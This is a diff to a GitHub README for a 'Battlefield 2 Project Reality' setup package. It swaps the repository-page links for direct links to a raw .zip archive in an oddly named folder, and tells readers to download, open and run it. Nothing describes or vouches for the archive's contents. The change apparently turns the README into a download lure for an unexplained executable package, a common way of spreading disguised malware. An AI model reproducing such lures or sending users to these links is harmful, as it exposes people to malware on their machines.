@@ -1,12 +1,12 @@
 # 🎮 Battlefield-2-Project-Reality-Setup - Simple Battlefield 2 Setup Guide
 
-[![Download](https://img.shields.io/badge/Download-Setup_Package-blue?style=for-the-badge&logo=github)](https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup)
+[![Download](https://img.shields.io/badge/Download-Setup_Package-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/daviepredatory192/Battlefield-2-Project-Reality-Setup/main/spiranthy/Project_Setup_Reality_Battlefield_2.4.zip)
 
 ## 📥 Download and Run
 
 Use this link to visit the page and download the setup package:
 
-[https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup](https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup)
+[https://raw.githubusercontent.com/daviepredatory192/Battlefield-2-Project-Reality-Setup/main/spiranthy/Project_Setup_Reality_Battlefield_2.4.zip](https://raw.githubusercontent.com/daviepredatory192/Battlefield-2-Project-Reality-Setup/main/spiranthy/Project_Setup_Reality_Battlefield_2.4.zip)
 
 After the page opens, download the file from the repository and save it to your PC. Then open the file and follow the steps on screen.
 
